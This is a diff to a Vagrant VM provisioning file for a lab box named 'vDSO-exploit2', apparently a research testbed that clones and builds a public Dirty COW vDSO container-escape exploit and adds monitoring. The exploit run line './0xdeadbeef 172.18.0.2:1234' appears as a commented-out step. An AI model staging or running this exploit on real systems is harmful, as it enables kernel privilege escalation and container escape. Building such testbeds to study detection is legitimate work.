@@ -5,7 +5,7 @@
   ip: "10.2.2.155"
   name: vDSO-exploit2
   forward_ports: 
-    - {guest: 7777, host: 7777}
+    - {guest: 8888, host: 8888}
          
   ram: 2048
   shell_commands:
@@ -18,12 +18,24 @@
        
       
       - { shell: 'git clone https://github.com/gebl/dirtycow-docker-vdso.git'}
-      - { shell: 'cd /home/vagrant/dirtycow-docker-vdso && sudo docker-compose build '}
+      - { shell: 'cd /home/vagrant/dirtycow-docker-vdso '}
+      
+      - { shell: '# Instrument Docker with DMLA monitoring'}
+      - { shell: 'cp /home/vagrant/vDSO-exploit2/docker-compose.yml /home/vagrant/dirtycow-docker-vdso '}
+      
+      - { shell: '# Build and loging into the docker container'}
+      - { shell: 'sudo docker-compose build '}
       - { shell: 'echo "Loging in to the docker container"  '}
-      - { shell: 'echo "sudo docker-compose run dirtycow /bin/bash"  '}
-      - { shell: ' cd /dirtycow-vdso"  '}
-      - { shell: ' make"  '}
-      - { shell: ' ./0xdeadbeef 172.18.0.2:1234"  '}
-      - { shell: ' wait...."  '}
+      - { shell: 'echo "cd /home/vagrant/dirtycow-docker-vdso" '} 
+      - { shell: 'sudo docker-compose run dirtycow /bin/bash"  '}
+      
+      
+      - { shell: '# sudo ifconfig '}
+      - { shell: '# cd /dirtycow-vdso && make  '}
+      - { shell: '# sudo ifconfig  '}
+      - { shell: '#./0xdeadbeef 172.18.0.2:1234"  '}
+      - { shell: '# wait...."  '}
+      - { shell: '# sudo ifconfig '}
+      
            
       
